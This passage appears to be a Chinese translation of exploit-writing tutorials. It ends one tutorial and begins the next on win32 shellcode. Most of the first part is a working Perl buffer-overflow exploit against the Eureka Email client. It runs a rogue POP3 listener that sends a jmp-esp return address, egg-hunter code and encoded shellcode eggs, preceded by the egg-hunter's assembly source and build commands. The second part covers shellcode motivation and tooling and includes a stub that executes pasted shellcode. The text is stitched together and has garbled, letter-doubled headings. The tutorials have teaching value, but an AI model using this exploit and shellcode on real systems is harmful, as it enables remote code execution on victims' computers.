JE done ; ** Added : If we have found all eggs,
; ** jump to shellcode
INC EBX ; ** Added : increment EBX
; (if we are not at the end of the eggs)
MOV EDI, ESI ; EDI = end of egg
reset_stack:
; Reset the stack to prevent problems cause by recursive SEH handlers and set
; ourselves up to handle and AVs we may cause by scanning memory:
XOR EAX, EAX ; EAX = 0
MOV ECX, [FS:EAX] ; EBX = SEH_chain => SEH_frames[X]
find_last_SEH_loop:
MOV ESP, ECX ; ESP = SEH_frames[X]
POP ECX ; EBX = SEH_frames[X].next_frame
CMP ECX, 0xFFFFFFFF ; SEH_frames[X].next_frame == none ?
JNE find_last_SEH_loop ; No "X -= 1", check next frame
POP EDX ; EDX = SEH_frames[0].handler
CALL create_SEH_handler ; SEH_frames[0].handler == SEH_handler
SEH_handler:
POPA ; ESI = [ESP + 4] ->
; struct exception_info
LEA ESP, [BYTE ESI+0x18] ; ESP = struct exception_info->exception_addr
POP EAX ; EAX = exception address 0x????????
OR AX, 0xFFF ; EAX = 0x?????FFF
INC EAX ; EAX = 0x?????FFF + 1 -> next page
JS done ; EAX > 0x7FFFFFFF ===> done
XCHG EAX, EDI ; EDI => next page
JMP reset_stack
done:
XOR EAX, EAX ; EAX = 0
CALL [BYTE FS:EAX + 8] ; EDI += Bottom of stack
; == position of egg in shellcode.
db marker_bytes_location
db max_index_location
db egg_size_location
编译修改后的代码，然后重新生成小代码块。
"c:\program files\nasm\nasm.exe" -f bin -o w32_omelet.bin
w32_SEH_corelanc0d3r_omelet.asm -w+error
w32_SEH_omelet.py w32_omelet.bin shellcode.bin calceggs.txt 127 0xBADA55
从新生成的calceggs.txt文件中拷贝出相关内容，并替换exploit中对应的内容。
新的exploit内容如下：
use Socket;
#fill out the local IP or hostname
#which is used by Eureka EMail as POP3 server
#note : must be exact match !
my $localserver = "192.168.0.193";
#calculate offset to EIP
my $junk = "A" x (723 - length($localserver));
my $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll
my $padding = "\x90" x 1000;
my $omelet_code = "\xbb\xfd\xff\xff\xff". #put 0xfffffffd in ebx
"\xEB\x2C\x51\x64\x89\x20\xFC\xB0\x7A\xF2\xAE\x50".
"\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77".
"\x15\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4".
"\x81\xFB\xFF\xFF\xFF\xFF". # compare EBX with FFFFFFFF
"\x74\x2B". #if EBX is FFFFFFFF, jump to shellcode
"\x43". #if not, increase EBX and continue
"\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9".
"\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xBE\xFF\xFF\xFF".
"\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x06".
"\x97\xE9\xD8\xFF\xFF\xFF\x31\xC0\x64\xFF\x50\x08";
my $egg1 = "\x7A\xFF\x55\xDA\xBA\x89\xE2\xDA\xC1\xD9\x72\xF4\x58\x50".
"\x59\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5A\x56\x54\x58\x33".
"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42".
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58".
"\x50\x38\x41\x43\x4A\x4A\x49\x4B\x4C\x4A\x48\x50\x44\x43\x30\x43\x30".
"\x45\x50\x4C\x4B\x47\x35\x47\x4C\x4C\x4B\x43\x4C\x43\x35\x43\x48\x45".
"\x51\x4A\x4F\x4C\x4B\x50\x4F\x42\x38\x4C\x4B\x51\x4F\x47\x50\x43\x31".
"\x4A\x4B\x51\x59\x4C\x4B\x46\x54\x4C\x4B\x43";
my $egg2 = "\x7A\xFE\x55\xDA\xBA\x31\x4A\x4E\x50\x31\x49\x50\x4C\x59".
"\x4E\x4C\x4C\x44\x49\x50\x43\x44\x43\x37\x49\x51\x49\x5A\x44\x4D\x43".
"\x31\x49\x52\x4A\x4B\x4A\x54\x47\x4B\x51\x44\x46\x44\x43\x34\x42\x55".
"\x4B\x55\x4C\x4B\x51\x4F\x51\x34\x45\x51\x4A\x4B\x42\x46\x4C\x4B\x44".
"\x4C\x50\x4B\x4C\x4B\x51\x4F\x45\x4C\x45\x51\x4A\x4B\x4C\x4B\x45\x4C".
"\x4C\x4B\x45\x51\x4A\x4B\x4D\x59\x51\x4C\x47\x54\x43\x34\x48\x43\x51".
"\x4F\x46\x51\x4B\x46\x43\x50\x50\x56\x45\x34\x4C\x4B\x47\x36\x50\x30".
"\x4C\x4B\x51\x50\x44\x4C\x4C\x4B\x44\x30\x45";
my $egg3 = "\x7A\xFD\x55\xDA\xBA\x4C\x4E\x4D\x4C\x4B\x45\x38\x43\x38".
"\x4B\x39\x4A\x58\x4C\x43\x49\x50\x42\x4A\x50\x50\x42\x48\x4C\x30\x4D".
"\x5A\x43\x34\x51\x4F\x45\x38\x4A\x38\x4B\x4E\x4D\x5A\x44\x4E\x46\x37".
"\x4B\x4F\x4D\x37\x42\x43\x45\x31\x42\x4C\x42\x43\x45\x50\x41\x41\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
my $garbage="This is a bunch of garbage" x 10;
my $payload=$junk.$ret.$omelet_code.$padding.$egg1.$garbage.$egg2.$garbage.$egg3;
print "Payload : " . length($payload)." bytes\n";
print "Omelet code : " . length($omelet_code)." bytes\n";
print " Egg 1 : " . length($egg1)." bytes\n";
print " Egg 2 : " . length($egg2)." bytes\n";
print " Egg 3 : " . length($egg3)." bytes\n";
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host \n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
$cnt=1;
while($cnt  Sent ".length($payload)." bytes\n";
$cnt=$cnt+1;
}
}
close CLIENT;
print "[+] Connection closed\n";
OK,虽然我做了些修改来减少了一点代码量，但代码还是明显更大了。现在我们看看结果：
哈哈，成功了！
EEEExxxxppppllllooooiiiitttt 编写系列教程第九篇：WWWWiiiinnnn33332222 SSSShhhheeeellllllllccccooooddddeeee 编写入门
译：看雪论坛-dragonltx-2010-9-15
在上几个月中，我已经写了一套打造目标为windows堆栈的exploits编写。任何人写
exploit的一个主要目标是改变程序的正常执行流程并触发程序执行任意的代码：攻击者注入
到程序并且能够允许攻击者控制电脑运行特定程序的代码。
这种类型的代码通常叫做“shellcode”，因为一个运行任意代码的最主要目标是允许攻击
者可以在主机上使用远程shell/command提示符，因此能够让他/她远程控制目标主机。
由于这类型的shellcode依然用在很多场合，Metasploit工具已经把这个理念更深入一些，
并且提供了framework来使这个过程更容易一些。观察他人的桌面，嗅探网络上的数据，dump
密码哈希，或者用自身拥有的设备来进行更深入的网络攻击，这些都是Metasploit的
payload/console能够为你提供的一些服务。毫无疑问，人类史富有创造性的，这又逐渐导致
一些更好的东西。
事实上，全部的这些都只是你能够用shellcode做到的一些变种。就是说，复杂的shellcode，
阶段性的shellcode，但其实都是shellcode。
通常，当人们在写exploit时，他们会首先趋向于用一些简单/小的shellcode来证明他们
能够注入代码并且使它执行。最著名和通用的例子是弹出计算器或者其他一些类似的。简单
的，短的，快的和不需要很多设置的代码。（事实上，每次当windows计算器在我的屏幕上
弹出时，我的妻子都会喝彩...甚至是我每次自己打开计算器:))
为了得到一个“弹出计算器”的shellcode样本，大部分人倾向于用Metasploit上已经可
用的shellcode生成器，或者从网上复制已经写好的代码，因为这些都是有效的。（嗯，我不
推荐使用在网上找到的shellcode是出于显而易见的原因）。坦白的说，Metasploit没什么错。
事实上，Metasploit上可用的payload都是很多人努力工作和奉献，精湛技艺的结果。这些
人值得我们所有人尊敬。Shellcode编写不只是运用技术，还需要很多的知识，创造力和技
巧。写shellcode不难，但是写好的shellcode是一门艺术。
大多数情况下，Metasploit（或者是其他公开的可用资源）的payload能够满足你的需求
并且允许你证明你的观点—你能通过漏洞来控制一台机器。
然而，今天我们来看看怎样你才能写出自己的shellcode并且克服执行代码过程中会停止
程序的一些限制（比如说null字节）。
很多资料和书已经写了这方面主题的东西，一些很棒的网站也在这方面做了很多的贡献。
但是为了使我的教程更完整，我决定把其中的一些信息整合起来，写自己的“win32shellcode
编写入门”。
我觉得exploit编写者懂得如何才能写出好的shellcode是很重要的。我的目标不是叫人们
写他们自己的shellcode，而是理解shellcode是怎么工作的（当你理解了为什么shellcode不
能工作时，知识就会得到的比较方便），并且在需要写特殊用途的shellcode功能时能够写出
自己的shellcode，或者在需要时修改一些已经存在的shellcode。
这篇文章将只是涉及已经有的思想，引导你理解如何写并用通用的shellcode。没有包括
一些新的技术和新类型的shellcode。但是我相信你是不会介意的。
如果你想读一些其他有关shellcode的文章，试一下下面的链接：
• Wikipedia
• Skylined
• ProjectShellcode/tutorials
• Shell-storm
• Phrack
• Skape
• Packetstormsecurityshellcodepapers/archive
• Amenext.com
• Vividmachines.com
• NTInternals.net(undocumentedfunctionsforMicrosoftWindows)
• DidierStevens
• Harmonysecurity
• Shellforge(convertctoshellcode)–forlinux
首先--------------------打造自己的 sssshhhheeeellllllllccccooooddddeeee 实验室
每个shellcode不过是一个小应用程序---一系列人们写的指令，设计用来做开发者想做的。
它能是任何东西，但是很明白shellcode里面的操作将会越来越复杂，最后的shellcode将会
变得越来越大。这将会呈现出其他的挑战（比如说在写exploit时使shellcode适合我们安排
的缓冲区，或者使shellcode工作的更可靠。我们将会在后面讨论这个）。
当我们看下exploit中用的shellcode的格式时，我们只能看到字节。这些字节是来自汇编
/CPU指令，但是假使我们想写自己的shellcode？我们要不要掌握汇编并且在asm里写这些
指令？嗯，这将会带来很多帮助。但是假如你只想让自己的自定义代码，一次，在一个特定
的操作系统，那么你只需要有限的asm知识。我不是一个伟大的asm专家，因此我能做到，
你一定也能做到。
在 windows 平台下些 shellcode 需要我们用一些 windowsAPI。这会如何影响到可靠的
shellcode的开发（或者shellcode的通用性，能够在不同的版本/补丁包系统中运行）将会在
文章的后面讨论。
在开始之前，让我们先打造我们的实验室：
C/C++编译器： lcc-win32,dev-c++,MSVisualStudioExpressC++
汇编编译器：nasm
调试器：ImmunityDebugger
反汇编：IDAFree(或者Pro如果你有证书的话 :-))
ActiveStatePerl(需要用来运行一些教程里用到的脚本）. 我用Perl5.8
Metasploit
Skylinedalpha3,testival,beta3
一些测试shellcode的c程序：（shellcodetest.c)
charcode[]="pasteyourshellcodehere";
intmain(intargc,char**argv)
{
int(*func)();
func=(int(*)())code;
(int)(*func)();